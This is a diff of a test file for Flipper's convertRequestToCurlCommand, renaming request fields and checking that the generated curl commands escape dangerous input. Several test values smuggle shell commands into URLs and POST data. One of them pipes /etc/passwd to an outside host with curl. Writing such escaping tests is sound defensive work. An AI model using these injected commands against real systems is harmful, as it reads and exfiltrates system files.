@@ -8,16 +8,15 @@
  */
 
 import {convertRequestToCurlCommand} from '../utils';
-import {Request} from '../types';
 
 test('convertRequestToCurlCommand: simple GET', () => {
-  const request: Request = {
+  const request = {
     id: 'request id',
     timestamp: 1234567890,
     method: 'GET',
     url: 'https://fbflipper.com/',
-    headers: [],
-    data: null,
+    requestHeaders: [],
+    requestData: undefined,
   };
 
   const command = convertRequestToCurlCommand(request);
@@ -25,13 +24,13 @@ test('convertRequestToCurlCommand: simple GET', () => {
 });
 
 test('convertRequestToCurlCommand: simple POST', () => {
-  const request: Request = {
+  const request = {
     id: 'request id',
     timestamp: 1234567890,
     method: 'POST',
     url: 'https://fbflipper.com/',
-    headers: [],
-    data: btoa('some=data&other=param'),
+    requestHeaders: [],
+    requestData: 'some=data&other=param',
   };
 
   const command = convertRequestToCurlCommand(request);
@@ -41,13 +40,13 @@ test('convertRequestToCurlCommand: simple POST', () => {
 });
 
 test('convertRequestToCurlCommand: malicious POST URL', () => {
-  let request: Request = {
+  let request = {
     id: 'request id',
     timestamp: 1234567890,
     method: 'POST',
     url: "https://fbflipper.com/'; cat /etc/password",
-    headers: [],
-    data: btoa('some=data&other=param'),
+    requestHeaders: [],
+    requestData: 'some=data&other=param',
   };
 
   let command = convertRequestToCurlCommand(request);
@@ -60,8 +59,8 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
     timestamp: 1234567890,
     method: 'POST',
     url: 'https://fbflipper.com/"; cat /etc/password',
-    headers: [],
-    data: btoa('some=data&other=param'),
+    requestHeaders: [],
+    requestData: 'some=data&other=param',
   };
 
   command = convertRequestToCurlCommand(request);
@@ -71,13 +70,13 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
 });
 
 test('convertRequestToCurlCommand: malicious POST URL', () => {
-  let request: Request = {
+  let request = {
     id: 'request id',
     timestamp: 1234567890,
     method: 'POST',
     url: "https://fbflipper.com/'; cat /etc/password",
-    headers: [],
-    data: btoa('some=data&other=param'),
+    requestHeaders: [],
+    requestData: 'some=data&other=param',
   };
 
   let command = convertRequestToCurlCommand(request);
@@ -90,8 +89,8 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
     timestamp: 1234567890,
     method: 'POST',
     url: 'https://fbflipper.com/"; cat /etc/password',
-    headers: [],
-    data: btoa('some=data&other=param'),
+    requestHeaders: [],
+    requestData: 'some=data&other=param',
   };
 
   command = convertRequestToCurlCommand(request);
@@ -101,13 +100,13 @@ test('convertRequestToCurlCommand: malicious POST URL', () => {
 });
 
 test('convertRequestToCurlCommand: malicious POST data', () => {
-  let request: Request = {
+  let request = {
     id: 'request id',
     timestamp: 1234567890,
     method: 'POST',
     url: 'https://fbflipper.com/',
-    headers: [],
-    data: btoa('some=\'; curl https://somewhere.net -d "$(cat /etc/passwd)"'),
+    requestHeaders: [],
+    requestData: 'some=\'; curl https://somewhere.net -d "$(cat /etc/passwd)"',
   };
 
   let command = convertRequestToCurlCommand(request);
@@ -120,8 +119,8 @@ test('convertRequestToCurlCommand: malicious POST data', () => {
     timestamp: 1234567890,
     method: 'POST',
     url: 'https://fbflipper.com/',
-    headers: [],
-    data: btoa('some=!!'),
+    requestHeaders: [],
+    requestData: 'some=!!',
   };
 
   command = convertRequestToCurlCommand(request);
@@ -131,13 +130,13 @@ test('convertRequestToCurlCommand: malicious POST data', () => {
 });
 
 test('convertRequestToCurlCommand: control characters', () => {
-  const request: Request = {
+  const request = {
     id: 'request id',
     timestamp: 1234567890,
     method: 'GET',
     url: 'https://fbflipper.com/',
-    headers: [],
-    data: btoa('some=\u0007 \u0009 \u000C \u001B&other=param'),
+    requestHeaders: [],
+    requestData: 'some=\u0007 \u0009 \u000C \u001B&other=param',
   };
 
   const command = convertRequestToCurlCommand(request);
